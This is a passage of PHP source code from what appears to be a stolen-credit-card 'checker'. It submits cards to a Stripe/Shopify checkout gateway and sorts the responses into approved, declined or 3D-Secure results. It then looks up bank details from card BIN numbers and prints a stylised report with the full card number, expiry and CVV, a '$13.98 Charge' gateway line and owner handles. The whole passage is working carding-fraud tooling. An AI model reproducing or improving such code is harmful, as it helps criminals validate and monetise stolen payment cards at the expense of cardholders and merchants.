        } elseif (str_contains($response5, 'CVV_DECLINED')) {
            $err = '✅ CVV DECLINED';
        } elseif (str_contains($response5, 'INCORRECT_CVC')) {
            $err = '✅ CVV DECLINED';
        } elseif (isset($r5js->data->receipt->processingError->code)) {
            $err = $r5js->data->receipt->processingError->code;
        } elseif (str_contains($response5, 'CompletePaymentChallenge')) {
            $err = '⚠️ 3D Secure Challenge Required!!';
        } elseif (str_contains($response5, 'https://blackmp.life/stripe/authentications/')) {
            $err = '⚠️3DS Required !!';
        } elseif (isset($r5js->data->receipt->action->__typename) && $r5js->data->receipt->action->__typename == 'CompletePaymentChallenge') {
            $err = '⚠️3DS Secure Required !!';
        } elseif (isset($r5js->data->receipt->action->url)) {
            $err = '⚠️ 3d Secure Card !!';
        } elseif (preg_match('/CompletePaymentChallenge/', $response5)) {
            $err = '⚠️ 3D secure Required';
        } else {
            $err = 'Response is empty! Check debug info';
        }

    } catch(Exception $e) {
        if (empty($err)) {
            $err = $e->getMessage();
        }
        // Log debug info on error
        file_put_contents('debug_'.time().'.json', json_encode($debug_info, JSON_PRETTY_PRINT));
    }

    // ▶️ BIN lookup
    $bin = substr($cc, 0, 6);

    // 🧠 First try binlist.net
    $bininfo = @json_decode(file_get_contents("https://lookup.binlist.net/{$bin}"), true);

    // 🔁 Fallback to antipublic if binlist fails or rate-limited
    if (!$bininfo || !isset($bininfo['bank'])) {
        $bininfo = @json_decode(file_get_contents("https://bins.antipublic.cc/bins/{$bin}"), true);
        $bank = $bininfo['data']['bank'] ?? 'Unavailable';
        $country = $bininfo['data']['country'] ?? 'Unknown';
        $brand = $bininfo['data']['vendor'] ?? 'Unknown';
        $type = $bininfo['data']['type'] ?? 'Unknown';
    } else {
        $bank = $bininfo['bank']['name'] ?? 'Unavailable';
        $country = $bininfo['country']['name'] ?? 'Unknown';
        $brand = $bininfo['scheme'] ?? 'Unknown';
        $type = $bininfo['type'] ?? 'Unknown';
    }

    // ▶️ Status logic
    if (stripos($err, 'CHARGED') !== false || stripos($err, 'purchase') !== false || stripos($err, '⚠️ 3D Secure Challenge Required!!') !== false || stripos($err, 'INCORRECT_CVC') !== false || stripos($err, 'Order') !== false) {
        $status = "✅ 𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 𝐂𝐂";
    } else {
        $status = "❌ 𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 𝐂𝐂";
    }

    $gate = "🛒 𝐆𝐀𝐓𝐄𝐖𝐀𝐘 ↯ Stripe + Shopify $13.98 (Graphql) Charge";

    $fullmsg  = "┏━━━━━━━━━━━━━━━━━━━━━━━┓\n";
    $fullmsg .= "💥 {$gate}\n";
    $fullmsg .= "━━━━━━━━━━━━━━━━━━━━━━━━━\n";
    $fullmsg .= "{$status}\n\n";
    $fullmsg .= "💳 𝐂𝐀𝐑𝐃   ↯ {$cc}|{$sub_month}|{$year}|{$cvv}\n";
    $fullmsg .= "📩 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 ↯ {$err}\n\n";
        
    $fullmsg .= "🏦 𝐁𝐀𝐍𝐊   ↯ {$bank} - {$brand} - {$type}\n";
    $fullmsg .= "🌎 𝐂𝐎𝐔𝐍𝐓𝐑𝐘 ↯ {$country}\n";
    $fullmsg .= "🕒 𝐓𝐈𝐌𝐄   ↯ " . date('Y-m-d H:i:s') . "\n";
    $fullmsg .= "⏱️ 𝐒𝐏𝐄𝐄𝐃  ↯ {$time_taken}s\n";

    $fullmsg .= "👑 𝐎𝐖𝐍𝐄𝐑 ↯ @mhitzxg | @pr0xy_xd\n";
    $fullmsg .= "┗━━━━━━━━━━━━━━━━━━━━━━━┛";

    echo "<pre>" . htmlspecialchars($fullmsg, ENT_QUOTES, 'UTF-8') . "</pre>";
    echo str_repeat(' ', 1024);
    flush();

}?>
